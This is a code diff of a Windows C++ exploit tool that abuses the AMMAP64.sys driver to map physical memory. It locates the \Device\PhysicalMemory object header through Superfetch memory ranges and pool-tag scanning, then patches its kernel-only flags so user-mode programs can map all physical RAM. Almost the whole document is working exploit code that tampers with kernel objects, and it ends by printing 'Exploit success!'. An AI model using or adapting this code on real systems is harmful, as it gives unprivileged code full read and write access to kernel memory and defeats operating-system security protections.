@@ -1,6 +1,12 @@
 #include "EnablePhysicalMemory.h"
 #include "AMMAP64.h"
 
+#include "Superfetch.h"
+
+#ifndef _WIN64
+#error This can only be compiled for 64bit
+#endif
+
 static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_T Length, PDWORD64 VirtualAddress)
 {
 	NTSTATUS			ntStatus;
@@ -113,6 +119,13 @@ int isPrintable(uint32_t uint32)
 		return false;
 }
 
+
+bool isInsidePhysicalRAM(uint64_t addr, SFMemoryInfo* mi, int nOfRange) {
+	for (int i = 0; i < nOfRange; i++) 
+		if (mi[i].Start <= addr && addr <= mi[i].End)
+			return true;
+	return false;
+}
 int main()
 {
 	printf("Usermode physical memory access enabler\n");
@@ -124,64 +137,75 @@ int main()
 	auto hDriver = OpenDriver();
 	if (!hDriver || hDriver == (HANDLE)-1) {
 		printf("Driver AMMAP64.sys is not running, launch the bat file...\n");
+		system("pause");
 		return 0;
 	}
 
-	
+	if (!SFSetup()) {
+		printf("You're not running with administrator privilege... relaunch with admin privileges to get access to required API.\n");
+		system("pause");
+	}
+
+	SFMemoryInfo myRanges[32] = { 0 };
+	int nOfRange = 0;
+	SFGetMemoryInfo(myRanges, nOfRange);
+	myRanges[nOfRange - 1].End -= 0x1000;
 	IoCommand myIo = { 0 };
 	myIo.offset = 0x0;
-	myIo.read.QuadPart = 0x1000;
+
+	myIo.read.QuadPart = 0x2000;
 	
 	bool bFound = false;
-
 	if (DriverMapMemory(hDriver, &myIo)) {
 
-		char *cursor = (char*)myIo.virtualmemory;
+		auto i = 0ULL;
+		for (i = 0; i < myRanges[nOfRange - 1].End; i += 0x1000) {
+			if (bFound)
+				break;
+			if (!isInsidePhysicalRAM(i, myRanges, nOfRange))
+				continue;
+			if (!DriverUnmapMemory(hDriver, &myIo))
+				break;
+			myIo.offset = i;
+			if (!DriverMapMemory(hDriver, &myIo))
+				break;
+			uint8_t* lpCursor = (uint8_t*)(myIo.virtualmemory);
+			uint32_t previousSize = 0;
 
-		while (myIo.offset <= 0x7FFFFFFF) {
-			auto pPoolHeader = (PPOOL_HEADER)cursor;
-			auto skipsize = (pPoolHeader->BlockSize << 4);
-			if ((pPoolHeader->PoolTag & 0x7FFFFFFF) != 0x74636553) // Prior to Windows 8 the kernel marked “protected” allocations by setting the most significant bit of PoolTag, so care should be taken to scan for both variants
-			{	
-				if (skipsize == 0 || !isPrintable(pPoolHeader->PoolTag & 0x7FFFFFFF)) skipsize = 0x1000;
-				cursor += skipsize;
-			}
-			else
-			{
-				auto pObjectHeader = (POBJECT_HEADER)(cursor + 0x30);
-				if (pObjectHeader->HandleCount >= 0 && pObjectHeader->HandleCount <= 3 && pObjectHeader->KernelObject == 1 && pObjectHeader->KernelOnlyAccess == 1)
-				{
-					printf("Found PhysicalMemory Object Header at %p\n", cursor += 0x30);
-					pObjectHeader->KernelObject = 0;
-					pObjectHeader->KernelOnlyAccess = 0;
-					bFound = true;
-					if (!DriverUnmapMemory(hDriver, &myIo)) {
-						printf("Failed to unmap memory?\n");
+			while (true) {
+				auto pPoolHeader = (PPOOL_HEADER)lpCursor;
+				auto blockSize = (pPoolHeader->BlockSize << 4);
+				auto previousBlockSize = (pPoolHeader->PreviousSize << 4);
+
+				if (previousBlockSize != previousSize ||
+					blockSize == 0 ||
+					blockSize >= 0xFFF ||
+					!isPrintable(pPoolHeader->PoolTag & 0x7FFFFFFF))
+					break;
+
+				previousSize = blockSize;
+
+				if (0x74636553 == pPoolHeader->PoolTag) {
+					auto pObjectHeader = (POBJECT_HEADER)(lpCursor + 0x30);
+					if (pObjectHeader->HandleCount >= 0  && pObjectHeader->HandleCount <= 3  && pObjectHeader->KernelObject == 1 && pObjectHeader->Flags == 0x16 && pObjectHeader->KernelOnlyAccess == 1)
+					{
+						printf("Found PhysicalMemory Object Header at %p\n", lpCursor += 0x30);
+						pObjectHeader->KernelObject = 0;
+						pObjectHeader->KernelOnlyAccess = 0;
+						bFound = true;
 						break;
 					}
-					break;
 				}
-
-				//printf("Found sect at : %I64x\n", dwOffset + (cursor - myMemory));
-				cursor += skipsize;
-			}
-
-			if ((ULONGLONG)(cursor - myIo.virtualmemory)+ sizeof(_POOL_HEADER) + sizeof(_OBJECT_HEADER) > myIo.read.QuadPart) //dirty hack....
-			{
-				if (!DriverUnmapMemory(hDriver, &myIo)) {
-					printf("Failed to unmap memory?\n");
+					
+				lpCursor += blockSize;
+				if ((lpCursor - ((uint8_t*)myIo.virtualmemory)) >= 0x1000)
 					break;
-				}
-				myIo.offset += 0x1000;
 
-				DriverMapMemory(hDriver, &myIo);
-				cursor = (char*)myIo.virtualmemory;
 			}
-			
 		}
 	}
 	if (!bFound) {
-		printf("Read %u bytes without finding the physical address, did you already patch?\nTesting access... (requires administrator or it will fail.)\n", myIo.offset);
+		printf("Read %lld bytes without finding the physical address, did you already patch?\nTesting access... (requires administrator or it will fail.)\n", myIo.offset);
 		
 	}
 	CloseDriver(hDriver);
@@ -194,7 +218,7 @@ int main()
 	if (hMemory && hMemory != (HANDLE)-1) {
 		CloseHandle(hMemory);
 		printf("Exploit success!\n");
-		printf("You can now map \Device\PhysicalMemory from usermode\n");
+		printf("You can now map \Device\PhysicalMemory from usermode, check https://github.com/waryas/UMPMLib/ as a guideline.\n");
 		system("pause");
 		return 0;
 	}
@@ -203,56 +227,6 @@ int main()
 	system("pause");
 
 	
-	/*
-
-	USE THIS CODE IN YOUR APPLICATION WITHOUT THE DRIVER PART TO USE PHYSICAL MEMORY !!!
-
-	if(MapPhysicalMemory(hMemory, &dwOffset, &dwRead, (PDWORD64) & myMemory))
-	{
-		char	*cursor = myMemory;
-		while(dwOffset <= 0x0FFFFFFF)
-		{
-			PPOOL_HEADER	x = (PPOOL_HEADER) cursor;
-			if(x->PoolTag != 0x74636553)
-			{	//Not a Sect pooltag
-				int skipsize = (x->BlockSize << 4);
-				if(skipsize == 0 || !isPrintable(x->PoolTag)) skipsize = 0x1000;
-
-				cursor += skipsize;
-			}
-			else
-			{
-				int				skipsize = (x->BlockSize << 4);
-
-				POBJECT_HEADER	objectHeader = (POBJECT_HEADER) (cursor + 0x30);
-				if(objectHeader->HandleCount >= 1 && objectHeader->HandleCount <= 3 && objectHeader->KernelObject == 1)
-				{
-					printf("Found PhysicalMemory Object Header at %p\n", cursor += 0x30);
-					objectHeader->KernelObject = 0;
-					objectHeader->KernelOnlyAccess = 0;
-				}
-
-				//printf("Found sect at : %I64x\n", dwOffset + (cursor - myMemory));
-				cursor += skipsize;
-			}
-
-			if((SIZE_T)(cursor - myMemory) >= dwRead)
-			{
-				if (!UnMapmemory((PDWORD64)myMemory)) {
-					printf("Failed to unmap memory?\n");
-					break;
-				}
-				dwOffset += 0x1000;
-
-				MapPhysicalMemory(hMemory, &dwOffset, &dwRead, (PDWORD64) & myMemory);
-				cursor = myMemory;
-			}
-
-			//break;
-		}
-	}
-	*/
-
 	
 	
 
